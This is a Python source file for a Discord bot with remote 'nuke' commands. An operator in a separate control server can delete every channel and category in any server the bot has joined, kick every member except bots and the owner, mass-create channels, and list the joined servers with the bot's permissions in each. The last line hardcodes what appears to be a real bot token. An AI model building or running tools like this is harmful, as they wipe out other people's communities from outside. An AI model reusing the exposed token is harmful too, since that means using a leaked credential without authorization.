import discord
from discord.ext import commands
from discord import app_commands
import asyncio

# Bot setup with intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Configuration - Add authorized user IDs who can run remote commands
AUTHORIZED_USERS = [
    1039776738508537907,  # OFFICERMILLS DISCORD USER ID
    # Add more user IDs as needed
]

# Optional: Specify a control server ID for extra security
CONTROL_SERVER_ID = 1387814650959364266  # OFFICERMILLS DISCORD SERVER

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} servers')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

def is_authorized_user(user_id: int) -> bool:
    """Check if user is authorized to run remote commands"""
    return user_id in AUTHORIZED_USERS

async def get_target_guild(guild_id: int) -> discord.Guild:
    """Get guild by ID with error handling"""
    guild = bot.get_guild(guild_id)
    if not guild:
        raise ValueError(f"Bot is not in server with ID: {guild_id}")
    return guild

@bot.tree.command(name="remote-clean", description="⚠️ DANGER: Remotely delete ALL channels in specified server")
@app_commands.describe(
    guild_id="The server ID where channels should be deleted",
    confirm="Type 'CONFIRM' to proceed with channel deletion"
)
async def remote_clean(interaction: discord.Interaction, guild_id: str, confirm: str):
    # Authorization check
    if not is_authorized_user(interaction.user.id):
        await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
        return
    
    # Optional: Check if command is run from control server
    if CONTROL_SERVER_ID and interaction.guild_id != CONTROL_SERVER_ID:
        await interaction.response.send_message("❌ This command can only be used in the authorized control server.", ephemeral=True)
        return
    
    # Confirmation check
    if confirm != "CONFIRM":
        await interaction.response.send_message("❌ You must type 'CONFIRM' to proceed with channel deletion.", ephemeral=True)
        return
    
    # Validate and get target guild
    try:
        target_guild_id = int(guild_id)
        target_guild = await get_target_guild(target_guild_id)
    except ValueError as e:
        await interaction.response.send_message(f"❌ Invalid server ID or bot not in server: {e}", ephemeral=True)
        return
    except Exception as e:
        await interaction.response.send_message(f"❌ Error accessing server: {e}", ephemeral=True)
        return
    
    # Check bot permissions in target guild
    bot_member = target_guild.get_member(bot.user.id)
    if not bot_member or not bot_member.guild_permissions.manage_channels:
        await interaction.response.send_message(f"❌ Bot lacks 'Manage Channels' permission in server: {target_guild.name}", ephemeral=True)
        return
    
    # Defer the response since this will take time
    await interaction.response.defer()
    
    deleted_count = 0
    failed_count = 0
    
    # Get all channels (excluding categories for now)
    channels_to_delete = [channel for channel in target_guild.channels if not isinstance(channel, discord.CategoryChannel)]
    
    await interaction.followup.send(f"🗑️ Starting deletion of {len(channels_to_delete)} channels in **{target_guild.name}**...")
    
    # Delete channels
    for channel in channels_to_delete:
        try:
            await channel.delete(reason=f"Remote clean command executed by {interaction.user} from server {interaction.guild.name if interaction.guild else 'DM'}")
            deleted_count += 1
            print(f"Deleted channel: {channel.name} in {target_guild.name}")
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            failed_count += 1
            print(f"Failed to delete channel: {channel.name} (Forbidden)")
        except discord.HTTPException as e:
            failed_count += 1
            print(f"Failed to delete channel: {channel.name} (HTTP Error: {e})")
    
    # Delete categories last
    categories = [channel for channel in target_guild.channels if isinstance(channel, discord.CategoryChannel)]
    for category in categories:
        try:
            await category.delete(reason=f"Remote clean command executed by {interaction.user}")
            deleted_count += 1
            print(f"Deleted category: {category.name} in {target_guild.name}")
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            failed_count += 1
            print(f"Failed to delete category: {category.name} (Forbidden)")
        except discord.HTTPException as e:
            failed_count += 1
            print(f"Failed to delete category: {category.name} (HTTP Error: {e})")
    
    # Send completion message to command executor and try to create log channel in target
    completion_msg = (f"✅ Remote clean operation completed on **{target_guild.name}**!\n"
                     f"Deleted: {deleted_count} channels\n"
                     f"Failed: {failed_count} channels")
    
    await interaction.followup.send(completion_msg)
    
    # Try to create a log channel in target server
    try:
        log_channel = await target_guild.create_text_channel("remote-bot-log")
        await log_channel.send(f"🤖 Remote operation log:\n{completion_msg}\nExecuted by: {interaction.user} from external server")
    except:
        print(f"Could not create log channel in {target_guild.name}")

@bot.tree.command(name="remote-purge", description="⚠️ DANGER: Remotely kick ALL members from specified server")
@app_commands.describe(
    guild_id="The server ID where members should be kicked",
    confirm="Type 'CONFIRM' to proceed with member purge"
)
async def remote_purge(interaction: discord.Interaction, guild_id: str, confirm: str):
    # Authorization check
    if not is_authorized_user(interaction.user.id):
        await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
        return
    
    # Optional: Check if command is run from control server
    if CONTROL_SERVER_ID and interaction.guild_id != CONTROL_SERVER_ID:
        await interaction.response.send_message("❌ This command can only be used in the authorized control server.", ephemeral=True)
        return
    
    # Confirmation check
    if confirm != "CONFIRM":
        await interaction.response.send_message("❌ You must type 'CONFIRM' to proceed with member purge.", ephemeral=True)
        return
    
    # Validate and get target guild
    try:
        target_guild_id = int(guild_id)
        target_guild = await get_target_guild(target_guild_id)
    except ValueError as e:
        await interaction.response.send_message(f"❌ Invalid server ID or bot not in server: {e}", ephemeral=True)
        return
    except Exception as e:
        await interaction.response.send_message(f"❌ Error accessing server: {e}", ephemeral=True)
        return
    
    # Check bot permissions in target guild
    bot_member = target_guild.get_member(bot.user.id)
    if not bot_member or not bot_member.guild_permissions.kick_members:
        await interaction.response.send_message(f"❌ Bot lacks 'Kick Members' permission in server: {target_guild.name}", ephemeral=True)
        return
    
    # Defer the response since this will take time
    await interaction.response.defer()
    
    kicked_count = 0
    failed_count = 0
    
    # Get all members except bots and server owner
    members_to_kick = [member for member in target_guild.members 
                      if not member.bot and member != target_guild.owner]
    
    await interaction.followup.send(f"👢 Starting purge of {len(members_to_kick)} members in **{target_guild.name}**...")
    
    # Kick members
    for member in members_to_kick:
        try:
            await member.kick(reason=f"Remote purge command executed by {interaction.user}")
            kicked_count += 1
            print(f"Kicked member: {member.display_name} from {target_guild.name}")
            # Delay to avoid rate limits
            await asyncio.sleep(1)
        except discord.Forbidden:
            failed_count += 1
            print(f"Failed to kick member: {member.display_name} (Forbidden - higher role or owner)")
        except discord.HTTPException as e:
            failed_count += 1
            print(f"Failed to kick member: {member.display_name} (HTTP Error: {e})")
    
    completion_msg = (f"✅ Remote purge operation completed on **{target_guild.name}**!\n"
                     f"Kicked: {kicked_count} members\n"
                     f"Failed: {failed_count} members\n"
                     f"Protected: Bots and Server owner")
    
    await interaction.followup.send(completion_msg)

@bot.tree.command(name="remote-create", description="Remotely create channels in specified server")
@app_commands.describe(
    guild_id="The server ID where channels should be created",
    amount="Number of channels to create (1-50)",
    channel_type="Type of channels to create",
    name_prefix="Prefix for channel names (optional)"
)
@app_commands.choices(channel_type=[
    app_commands.Choice(name="Text", value="text"),
    app_commands.Choice(name="Voice", value="voice")
])
async def remote_create(interaction: discord.Interaction, guild_id: str, amount: int, channel_type: str, name_prefix: str = None):
    # Authorization check
    if not is_authorized_user(interaction.user.id):
        await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
        return
    
    # Optional: Check if command is run from control server
    if CONTROL_SERVER_ID and interaction.guild_id != CONTROL_SERVER_ID:
        await interaction.response.send_message("❌ This command can only be used in the authorized control server.", ephemeral=True)
        return
    
    # Validate amount
    if amount < 1 or amount > 50:
        await interaction.response.send_message("❌ Amount must be between 1 and 50 channels.", ephemeral=True)
        return
    
    # Validate and get target guild
    try:
        target_guild_id = int(guild_id)
        target_guild = await get_target_guild(target_guild_id)
    except ValueError as e:
        await interaction.response.send_message(f"❌ Invalid server ID or bot not in server: {e}", ephemeral=True)
        return
    except Exception as e:
        await interaction.response.send_message(f"❌ Error accessing server: {e}", ephemeral=True)
        return
    
    # Check bot permissions in target guild
    bot_member = target_guild.get_member(bot.user.id)
    if not bot_member or not bot_member.guild_permissions.manage_channels:
        await interaction.response.send_message(f"❌ Bot lacks 'Manage Channels' permission in server: {target_guild.name}", ephemeral=True)
        return
    
    # Check channel limits (Discord has a 500 channel limit per server)
    current_channel_count = len(target_guild.channels)
    if current_channel_count + amount > 500:
        await interaction.response.send_message(f"❌ Creating {amount} channels would exceed Discord's 500 channel limit. Current: {current_channel_count}", ephemeral=True)
        return
    
    # Defer the response since this will take time
    await interaction.response.defer()
    
    created_count = 0
    failed_count = 0
    
    # Set default name prefix if not provided
    if not name_prefix:
        name_prefix = f"new-{channel_type}"
    
    await interaction.followup.send(f"🔨 Starting creation of {amount} {channel_type} channels in **{target_guild.name}**...")
    
    # Create channels
    for i in range(1, amount + 1):
        try:
            channel_name = f"{name_prefix}-{i}"
            
            if channel_type == "text":
                await target_guild.create_text_channel(
                    name=channel_name,
                    reason=f"Remote create command executed by {interaction.user} from external server"
                )
            elif channel_type == "voice":
                await target_guild.create_voice_channel(
                    name=channel_name,
                    reason=f"Remote create command executed by {interaction.user} from external server"
                )
            
            created_count += 1
            print(f"Created {channel_type} channel: {channel_name} in {target_guild.name}")
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
            
        except discord.Forbidden:
            failed_count += 1
            print(f"Failed to create channel {i}: Forbidden")
        except discord.HTTPException as e:
            failed_count += 1
            print(f"Failed to create channel {i}: HTTP Error: {e}")
        except Exception as e:
            failed_count += 1
            print(f"Failed to create channel {i}: Unexpected error: {e}")
    
    # Send completion message
    completion_msg = (f"✅ Remote channel creation completed on **{target_guild.name}**!\n"
                     f"Created: {created_count} {channel_type} channels\n"
                     f"Failed: {failed_count} channels\n"
                     f"Name pattern: {name_prefix}-1, {name_prefix}-2, etc.")
    
    await interaction.followup.send(completion_msg)
    
    # Try to send log to target server
    try:
        # Find a suitable channel to send log (prefer general, system channel, or first text channel)
        log_channel = None
        
        # Try to find a general channel
        for channel in target_guild.text_channels:
            if channel.name.lower() in ['general', 'main', 'chat']:
                log_channel = channel
                break
        
        # If no general channel, use system channel or first available text channel
        if not log_channel:
            log_channel = target_guild.system_channel or target_guild.text_channels[0] if target_guild.text_channels else None
        
        if log_channel:
            await log_channel.send(f"🤖 **Remote Channel Creation Log**\n{completion_msg}\nExecuted by: {interaction.user} from external server")
    except:
        print(f"Could not send log message in {target_guild.name}")

@bot.tree.command(name="list-servers", description="List all servers the bot is in (for authorized users)")
async def list_servers(interaction: discord.Interaction):
    # Authorization check
    if not is_authorized_user(interaction.user.id):
        await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
        return
    
    # Optional: Check if command is run from control server
    if CONTROL_SERVER_ID and interaction.guild_id != CONTROL_SERVER_ID:
        await interaction.response.send_message("❌ This command can only be used in the authorized control server.", ephemeral=True)
        return
    
    guilds_info = []
    for guild in bot.guilds:
        member_count = guild.member_count
        bot_member = guild.get_member(bot.user.id)
        permissions = []
        
        if bot_member:
            if bot_member.guild_permissions.manage_channels:
                permissions.append("Manage Channels")
            if bot_member.guild_permissions.kick_members:
                permissions.append("Kick Members")
            if bot_member.guild_permissions.administrator:
                permissions.append("Administrator")
        
        perm_str = ", ".join(permissions) if permissions else "Limited permissions"
        guilds_info.append(f"**{guild.name}**\n└ ID: `{guild.id}`\n└ Members: {member_count}\n└ Permissions: {perm_str}")
    
    if not guilds_info:
        await interaction.response.send_message("Bot is not in any servers.", ephemeral=True)
        return
    
    # Split into chunks if too long
    message = "🤖 **Bot Server List:**\n\n" + "\n\n".join(guilds_info)
    
    if len(message) > 2000:
        # Send in multiple messages if too long
        await interaction.response.send_message("🤖 **Bot Server List:**", ephemeral=True)
        chunks = [guilds_info[i:i+5] for i in range(0, len(guilds_info), 5)]
        for chunk in chunks:
            chunk_message = "\n\n".join(chunk)
            if len(chunk_message) > 2000:
                # Individual server info too long, truncate
                chunk_message = chunk_message[:1900] + "...\n(truncated)"
            await interaction.followup.send(chunk_message, ephemeral=True)
    else:
        await interaction.response.send_message(message, ephemeral=True)

# Error handling
@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CommandOnCooldown):
        await interaction.response.send_message(f"Command is on cooldown. Try again in {error.retry_after:.2f} seconds.", ephemeral=True)
    else:
        if not interaction.response.is_done():
            await interaction.response.send_message("An error occurred while executing the command.", ephemeral=True)
        print(f"Error: {error}")

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
if __name__ == "__main__":
    bot.run('MTM3MjQ2NTY0NjEzMDA0MDkxMg.GP6brz.tK809ia2UWKiW0Xr9hPrkHFPhSjHeWqmrB7EuY')